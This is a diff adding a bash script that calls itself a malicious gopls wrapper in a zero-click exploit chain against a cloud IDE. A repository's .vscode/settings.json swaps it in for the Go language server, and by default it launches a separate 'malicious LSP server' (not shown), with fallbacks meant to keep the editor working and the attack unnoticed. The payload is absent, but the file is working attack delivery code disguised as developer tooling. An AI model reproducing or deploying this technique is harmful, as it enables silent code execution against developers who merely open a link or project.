@@ -1,0 +1,212 @@
+#!/usr/bin/env bash
+# =============================================================================
+# gopls-wrapper — Malicious LSP wrapper for the zero-click exploit chain
+# =============================================================================
+#
+# SURVIVAL REQUIREMENTS:
+#   - Must be executable (chmod +x)
+#   - Must forward ALL stdio cleanly (LSP protocol over stdin/stdout)
+#   - Must forward signals (SIGTERM, SIGINT, SIGHUP)
+#   - Must handle Node.js absence gracefully (fallback to real gopls)
+#   - Must write ALL diagnostics to stderr (stdio is LSP transport)
+#   - Must survive Cloud Shell process supervision (no orphan processes)
+#
+# INSTALLED BY:
+#   Cloud Shell deep link → git clone → .vscode/settings.json →
+#     "go.alternateTools": { "gopls": "./gopls-wrapper" }
+#
+# ENVIRONMENT:
+#   Cloud Shell container: Ubuntu 24.04, Node.js LTS, Code OSS 1.109+
+#
+# USAGE:
+#   ./gopls-wrapper [args...]
+#     All args are forwarded to lsp-server.js
+#     With --mode=passive, it acts as a transparent proxy to real gopls
+# =============================================================================
+
+set -euo pipefail
+
+# ── Resolve the directory containing this script ───────────────────────────────
+# Works regardless of how the script is invoked (absolute, relative, symlink)
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
+
+# ── Logging (to stderr to keep stdio clean for LSP) ───────────────────────────
+log() {
+  echo "[${SCRIPT_NAME}] $(date -Iseconds) $*" >&2
+}
+
+# ── Cleanup handler ───────────────────────────────────────────────────────────
+# Must forward signals to child process and clean up on exit
+cleanup() {
+  local sig="${1:-SIGTERM}"
+  log "Received ${sig} — cleaning up"
+  if [ -n "${CHILD_PID:-}" ] && kill -0 "${CHILD_PID}" 2>/dev/null; then
+    log "Forwarding ${sig} to child PID ${CHILD_PID}"
+    kill "-${sig}" "${CHILD_PID}" 2>/dev/null || true
+    # Wait briefly for graceful shutdown
+    local waited=0
+    while kill -0 "${CHILD_PID}" 2>/dev/null && [ "${waited}" -lt 5 ]; do
+      sleep 0.5
+      waited=$((waited + 1))
+    done
+    # Force kill if still alive
+    if kill -0 "${CHILD_PID}" 2>/dev/null; then
+      log "Force killing child PID ${CHILD_PID}"
+      kill -9 "${CHILD_PID}" 2>/dev/null || true
+    fi
+  fi
+  exit 0
+}
+
+# ── Signal trapping ───────────────────────────────────────────────────────────
+# Use EXIT trap + signal handlers for reliable cleanup
+trap 'cleanup SIGTERM' SIGTERM
+trap 'cleanup SIGINT' SIGINT
+trap 'cleanup SIGHUP' SIGHUP
+trap 'cleanup EXIT' EXIT  # cleanup on normal exit too (but won't duplicate with signals)
+
+# Prevent EXIT trap from double-firing
+SIGNALED=false
+for sig in SIGTERM SIGINT SIGHUP; do
+  trap 'SIGNALED=true; cleanup '"${sig}"'; exit 0' "${sig}"
+done
+trap 'if [ "${SIGNALED}" != "true" ]; then cleanup EXIT; fi' EXIT
+
+# ── Node.js discovery ─────────────────────────────────────────────────────────
+# Multiple fallback paths since Cloud Shell may have various Node.js installs
+find_node() {
+  # 1. Direct command check (honors PATH, nvm, etc.)
+  if command -v node &>/dev/null; then
+    command -v node
+    return 0
+  fi
+
+  # 2. Common nvm paths
+  for nvm_ver in "$HOME/.nvm/versions/node/"*; do
+    if [ -x "${nvm_ver}/bin/node" ]; then
+      echo "${nvm_ver}/bin/node"
+      return 0
+    fi
+  done
+
+  # 3. Cloud Shell default Node.js location
+  if [ -x "/usr/local/bin/node" ]; then
+    echo "/usr/local/bin/node"
+    return 0
+  fi
+
+  # 4. System Node.js
+  if [ -x "/usr/bin/node" ]; then
+    echo "/usr/bin/node"
+    return 0
+  fi
+
+  # 5. NodeSource install
+  if [ -x "/usr/local/n/versions/node/"*/bin/node ]; then
+    echo "/usr/local/n/versions/node/"*/bin/node | head -1
+    return 0
+  fi
+
+  return 1
+}
+
+# ── LSP server path ───────────────────────────────────────────────────────────
+LSP_SERVER="${SCRIPT_DIR}/lsp-server.js"
+
+# ── Argument parsing ──────────────────────────────────────────────────────────
+MODE="attack"
+NODE_ARGS=()
+
+for arg in "$@"; do
+  case "${arg}" in
+    --mode=*)
+      MODE="${arg#--mode=}"
+      ;;
+    --passive|--transparent)
+      MODE="passive"
+      ;;
+    --delay-ms=*)
+      NODE_ARGS+=("${arg}")
+      ;;
+    *)
+      # Forward to real gopls if in passthrough mode
+      NODE_ARGS+=("${arg}")
+      ;;
+  esac
+done
+
+# ── Mode: PASSIVE (transparent proxy to real gopls) ───────────────────────────
+if [ "${MODE}" = "passive" ] || [ "${MODE}" = "transparent" ]; then
+  log "MODE: PASSIVE — forwarding to real gopls"
+
+  # Find real gopls
+  REAL_GOPLS=""
+  for candidate in \
+    "$(command -v gopls 2>/dev/null || true)" \
+    "$HOME/go/bin/gopls" \
+    "/usr/local/go/bin/gopls" \
+    "/usr/local/bin/gopls" \
+    "/usr/bin/gopls" \
+    "$(which gopls 2>/dev/null || true)"; do
+    if [ -n "${candidate}" ] && [ -x "${candidate}" ] && [ "${candidate}" != "${SCRIPT_DIR}/${SCRIPT_NAME}" ]; then
+      REAL_GOPLS="${candidate}"
+      break
+    fi
+  done
+
+  if [ -z "${REAL_GOPLS}" ]; then
+    log "ERROR: No real gopls found — falling back to lsp-server.js in passive mode"
+    MODE="attack"
+  else
+    log "Forwarding to real gopls: ${REAL_GOPLS}"
+    exec "${REAL_GOPLS}" "$@"
+    # exec replaces this process — cleanup trap fires on the exec'd process
+  fi
+fi
+
+# ── Mode: ATTACK (malicious LSP server) ───────────────────────────────────────
+log "MODE: ATTACK — launching malicious LSP server"
+log "Script dir: ${SCRIPT_DIR}"
+log "LSP server: ${LSP_SERVER}"
+
+# Verify LSP server exists
+if [ ! -f "${LSP_SERVER}" ]; then
+  log "FATAL: lsp-server.js not found at ${LSP_SERVER}"
+  log "Falling back to real gopls (if available)"
+  exec gopls "$@" 2>/dev/null || {
+    log "FATAL: No fallback available — exiting"
+    exit 1
+  }
+fi
+
+# Find Node.js
+NODE_BIN="$(find_node)"
+if [ -z "${NODE_BIN}" ]; then
+  log "FATAL: Node.js not found — falling back to real gopls"
+  exec gopls "$@" 2>/dev/null || {
+    log "FATAL: No Node.js and no gopls — exiting"
+    exit 1
+  }
+fi
+
+log "Node.js: ${NODE_BIN} ($("${NODE_BIN}" --version 2>/dev/null || echo 'unknown'))"
+
+# ── Launch ────────────────────────────────────────────────────────────────────
+# Use exec to replace the wrapper process with the LSP server.
+# This ensures:
+#   - Signals go directly to Node.js (no intermediate shell)
+#   - Exit codes propagate correctly
+#   - No zombie/orphan processes
+#   - Cloud Shell's process monitor tracks the correct PID
+
+# The wrapper becomes lsp-server.js — all stdio passes through directly.
+exec "${NODE_BIN}" \
+  --unhandled-rejections=strict \
+  "${LSP_SERVER}" \
+  --mode="${MODE}" \
+  "${NODE_ARGS[@]}"
+
+# If exec fails (shouldn't happen), fall through to exit
+log "FATAL: exec failed"
+exit 1
